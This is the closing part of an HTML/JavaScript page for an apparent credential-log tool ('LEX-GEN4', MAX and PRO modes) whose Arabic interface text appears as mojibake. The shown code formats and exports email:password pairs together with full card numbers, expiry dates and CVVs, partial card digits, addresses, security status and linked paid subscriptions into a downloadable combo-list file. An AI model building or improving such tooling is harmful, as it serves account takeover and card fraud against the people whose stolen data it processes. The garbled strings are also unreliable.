                 paymentSpan.textContent = `ğŸ’³ Ø·Ø±ÙŠÙ‚Ø© Ø¯ÙØ¹ ÙØ¹Ù‘Ø§Ù„Ø©`; 
                 pwDiv.appendChild(paymentSpan); 
            }
            
            if (toolType === 'pro' && securityStatus) {
                 const securitySpan = document.createElement("span"); securitySpan.className = "security-note"; securitySpan.textContent = `ğŸ”’ ${securityStatus}`; pwDiv.appendChild(securitySpan);
            }
            if (toolType === 'pro' && ultraCardDetails) {
                 const cardSpan = document.createElement("span"); cardSpan.className = "ultra-cc-note"; cardSpan.textContent = `âš¡ï¸ CC FULL | ${ultraCardDetails.number} | ${ultraCardDetails.month}/${ultraCardDetails.year} | CVV: ${ultraCardDetails.cvv}`; pwDiv.appendChild(cardSpan);
            }
            else if (toolType === 'pro' && cardDetails) {
                 const cardSpan = document.createElement("span"); cardSpan.className = "cc-note"; cardSpan.textContent = `ğŸ’³ CC PARTIAL | ****${cardDetails.last4} (${cardDetails.month}/${cardDetails.year})`; pwDiv.appendChild(cardSpan);
            }
            if (toolType === 'pro' && addressDetails) {
                 const addressSpan = document.createElement("span"); addressSpan.className = "address-note"; addressSpan.textContent = `ğŸ“ Ø§Ù„Ø¹Ù†ÙˆØ§Ù†: ${addressDetails.city}, ${addressDetails.zip}`; pwDiv.appendChild(addressSpan);
            }
            if (toolType === 'pro' && extendedFeatures.length > 0) {
                 const featureSpan = document.createElement("span"); featureSpan.className = "feature-note";
                 const featureNames = extendedFeatures.map(f => {
                    if (f === 'disney+') return 'Disney+';
                    if (f === 'hbomax') return 'HBO Max';
                    if (f === 'eaplay') return 'EA Play';
                    if (f === 'amazonprime') return 'Prime';
                    if (f === 'discordnitro') return 'Nitro';
                    if (f === 'chatgptplus') return 'ChatGPT Plus';
                    if (f === 'adobecc') return 'Adobe CC';
                    if (f === 'midjourney') return 'Midjourney';
                    return f.charAt(0).toUpperCase() + f.slice(1);
                 }).join(', ');
                 featureSpan.textContent = `ğŸ”¥ Ø®Ø¯Ù…Ø§Øª: ${featureNames}`; pwDiv.appendChild(featureSpan);
            }
            
            leftDiv.appendChild(emailDiv); leftDiv.appendChild(pwDiv);
            const controlsDiv = document.createElement("div"); controlsDiv.className = "controls";
            const copyEmailBtn = document.createElement("button"); copyEmailBtn.className = "copy-btn btn-red"; copyEmailBtn.textContent = "Ù†Ø³Ø® Ø§Ù„Ø¥ÙŠÙ…ÙŠÙ„"; copyEmailBtn.onclick = async () => { await copyText(email) && showToast("ØªÙ… Ù†Ø³Ø® Ø§Ù„Ø¥ÙŠÙ…ÙŠÙ„"); };
            const copyPwBtn = document.createElement("button"); copyPwBtn.className = "copy-btn btn-black"; copyPwBtn.textContent = "Ù†Ø³Ø® Ø§Ù„Ø¨Ø§Ø³ÙˆØ±Ø¯"; copyPwBtn.onclick = async () => { await copyText(password) && showToast("ØªÙ… Ù†Ø³Ø® Ø§Ù„Ø¨Ø§Ø³ÙˆØ±Ø¯"); };
            controlsDiv.appendChild(copyEmailBtn); controlsDiv.appendChild(copyPwBtn);
            itemDiv.appendChild(leftDiv); itemDiv.appendChild(controlsDiv);
            listElement.appendChild(itemDiv);
        });
        
        parseBtn.classList.remove('processing');
        parseBtn.textContent = (toolType === 'max') ? "Ø§Ø³ØªØ®Ø±Ø§Ø¬ ÙˆØªØ¯Ù‚ÙŠÙ‚ MAX" : "Ø§Ø³ØªØ®Ø±Ø§Ø¬ ÙˆØªØ¯Ù‚ÙŠÙ‚ PRO";
        showToast(`ØªÙ… Ø§Ø³ØªØ®Ø±Ø§Ø¬ ${uniqueResults.length} Ù†ØªÙŠØ¬Ø© ÙØ±ÙŠØ¯Ø©`)
    }
    
    function setupCopyDownload(listElement, copyBtn, downloadBtn, toolName) { 
        copyBtn.onclick = async () => { 
            const e = listElement.querySelectorAll(".item");
            if (!e.length) return void showToast("Ù„Ø§ ØªÙˆØ¬Ø¯ Ù†ØªØ§Ø¦Ø¬ Ù„Ù†Ø³Ø®Ù‡Ø§");
            
            const t = [...e].map(e => { 
                const emailDiv = e.querySelector(".email");
                let email = emailDiv.textContent.trim(); 
                // Ø¥Ø²Ø§Ù„Ø© Ø±Ù…Ø² Ø§Ù„ÙÙŠØ²Ø§ Ù…Ù† Ø§Ù„Ø§ÙŠÙ…ÙŠÙ„ Ù‚Ø¨Ù„ Ø§Ù„Ù†Ø³Ø® Ù„Ø¬Ø¹Ù„Ù‡ Ù†Ø¸ÙŠÙØ§Ù‹
                if (email.startsWith('ğŸ’³')) {
                     email = email.substring(1).trim(); 
                }
                
                const pwDiv = e.querySelector(".pw");
                const password = pwDiv.firstChild.textContent.trim(); 
                
                const notes = [...pwDiv.querySelectorAll('.gamepass-note, .price-note, .cc-note, .address-note, .ultra-cc-note, .feature-note, .security-note')].map(span => {
                    let text = span.textContent.trim();
                    text = text.replace('ğŸ® ÙƒÙŠÙ… Ø¨Ø§Ø³', 'Game Pass'); text = text.replace('ğŸ’² Ø±ØµÙŠØ¯', 'Credit');
                    text = text.replace('âš¡ï¸ CC FULL | ', 'CC FULL: '); text = text.replace('ğŸ’³ CC PARTIAL | ', 'CC PARTIAL: ');
                    text = text.replace('ğŸ’³ Ø·Ø±ÙŠÙ‚Ø© Ø¯ÙØ¹ ÙØ¹Ù‘Ø§Ù„Ø©', 'PAYMENT_METHOD'); // Ø§Ù„ØªØ¹Ø¯ÙŠÙ„ Ø§Ù„Ø¬Ø¯ÙŠØ¯
                    text = text.replace('ğŸ“ Ø§Ù„Ø¹Ù†ÙˆØ§Ù†: ', 'Address: '); text = text.replace('ğŸ”’ ', 'Security: ');
                    text = text.replace('ğŸ”¥ Ø®Ø¯Ù…Ø§Øª: ', 'Features: ');
                    return text;
                }).join(' | ');

                
                let resultLine = email + ":" + password;
                // ØªØ¹Ø¯ÙŠÙ„ Ù„ØªÙ†Ø¸ÙŠÙ Ø§Ù„ÙÙˆØ§ØµÙ„ Ø¨Ø´ÙƒÙ„ Ø£ÙØ¶Ù„ ÙˆØ¶Ù…Ø§Ù† Ø§Ù„Ø´ÙƒÙ„ Ø§Ù„Ù…Ø·Ù„ÙˆØ¨: Email:Password | Ù…Ù„Ø§Ø­Ø¸Ø©1 | Ù…Ù„Ø§Ø­Ø¸Ø©2
                if (notes) {
                    resultLine += ' | ' + notes;
                }
                return resultLine.trim().replace(/ \| \| /g, ' | ').replace(/ \|$/, ''); 
            }).join("\n");
            
            await copyText(t) && showToast(`ØªÙ… Ù†Ø³Ø® ÙƒÙ„ Ù†ØªØ§Ø¦Ø¬ ${toolName} (GEN4)`);
        };
        
        downloadBtn.onclick = () => { 
            const e = listElement.querySelectorAll(".item");
            if (!e.length) return void showToast("Ù„Ø§ ØªÙˆØ¬Ø¯ Ù†ØªØ§Ø¦Ø¬ Ù„Ù„ØªÙ†Ø²ÙŠÙ„");
            
            const t = [...e].map(e => { 
                const emailDiv = e.querySelector(".email");
                let email = emailDiv.textContent.trim();
                if (email.startsWith('ğŸ’³')) {
                     email = email.substring(1).trim(); 
                }
                
                const pwDiv = e.querySelector(".pw");
                const password = pwDiv.firstChild.textContent.trim(); 
                
                const notes = [...pwDiv.querySelectorAll('.gamepass-note, .price-note, .cc-note, .address-note, .ultra-cc-note, .feature-note, .security-note')].map(span => {
                    let text = span.textContent.trim();
                    text = text.replace('ğŸ® ÙƒÙŠÙ… Ø¨Ø§Ø³', 'Game Pass'); text = text.replace('ğŸ’² Ø±ØµÙŠØ¯', 'Credit');
                    text = text.replace('âš¡ï¸ CC FULL | ', 'CC FULL: '); text = text.replace('ğŸ’³ CC PARTIAL | ', 'CC PARTIAL: ');
                    text = text.replace('ğŸ’³ Ø·Ø±ÙŠÙ‚Ø© Ø¯ÙØ¹ ÙØ¹Ù‘Ø§Ù„Ø©', 'PAYMENT_METHOD'); // Ø§Ù„ØªØ¹Ø¯ÙŠÙ„ Ø§Ù„Ø¬Ø¯ÙŠØ¯
                    text = text.replace('ğŸ“ Ø§Ù„Ø¹Ù†ÙˆØ§Ù†: ', 'Address: '); text = text.replace('ğŸ”’ ', 'Security: ');
                    text = text.replace('ğŸ”¥ Ø®Ø¯Ù…Ø§Øª: ', 'Features: ');
                    return text;
                }).join(' | ');
                
                let resultLine = email + ":" + password;
                if (notes) {
                    resultLine += ' | ' + notes;
                }
                return resultLine.trim().replace(/ \| \| /g, ' | ').replace(/ \|$/, '');
            }).join("\n");
            
            const o = new Blob([t], { type: "text/plain;charset=utf-8" }), n = URL.createObjectURL(o), c = document.createElement("a");
            c.href = n, c.download = `${toolName}_emails_passwords_LEX-GEN4.txt`, c.click(), URL.revokeObjectURL(n), showToast("ØªÙ… ØªÙ†Ø²ÙŠÙ„ Ø§Ù„Ù…Ù„Ù Ø¨Ù†Ø¬Ø§Ø­");
        };
    }

    function navigateTo(pageId) { 
        if (pageId === 'tool') {
            toolPage.classList.remove('hidden');
            adminPage.classList.add('hidden');
        } else if (pageId === 'admin') {
            toolPage.classList.add('hidden');
            adminPage.classList.remove('hidden');
        }
    }
    
    // Ø¥Ø®ÙØ§Ø¡ Ø´Ø§Ø´Ø© Ø§Ù„Ø¯Ø®ÙˆÙ„ ÙˆØ¹Ø±Ø¶ Ø§Ù„Ø£Ø¯Ø§Ø©
    function hideSplashScreen() {
        splashScreen.style.opacity = '0';
        toolPage.style.opacity = '1';
        setTimeout(() => {
            splashScreen.classList.add('hidden');
        }, 1000); 
    }

    // **********************************************
    // ** ØªÙ‡ÙŠØ¦Ø© Ø§Ù„ØµÙØ­Ø© Ø¹Ù†Ø¯ Ø§Ù„ØªØ­Ù…ÙŠÙ„ **
    // **********************************************
    window.onload = () => {
        // ØªÙ… Ø§Ù„ØªØ¹Ø¯ÙŠÙ„ Ù‡Ù†Ø§: Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø§Ù„ÙÙˆØ±ÙŠ Ø¥Ù„Ù‰ Ø§Ù„Ø£Ø¯Ø§Ø© (0ms) Ù„ØªØ¬Ù†Ø¨ Ø§Ù„ØªØ¹Ù„ÙŠÙ‚
        setTimeout(hideSplashScreen, 0); 

        clearBtnMax.onclick = () => { inputMax.value = "", listMax.innerHTML = "", showToast("ØªÙ… Ù…Ø³Ø­ Ù…Ø­ØªÙˆÙ‰ Ø£Ø¯Ø§Ø© MAX"); };
        setupCopyDownload(listMax, copyAllBtnMax, downloadBtnMax, "MAX");
        
        clearBtnPro.onclick = () => { inputPro.value = "", listPro.innerHTML = "", showToast("ØªÙ… Ù…Ø³Ø­ Ù…Ø­ØªÙˆÙ‰ Ø£Ø¯Ø§Ø© PRO"); };
        setupCopyDownload(listPro, copyAllBtnPro, downloadBtnPro, "PRO");

        copyCodeBtn.onclick = copyGeneratedCode;
        
        switchTool('max'); 
        navigateTo('tool'); 
    };

</script>
</body>
</html>
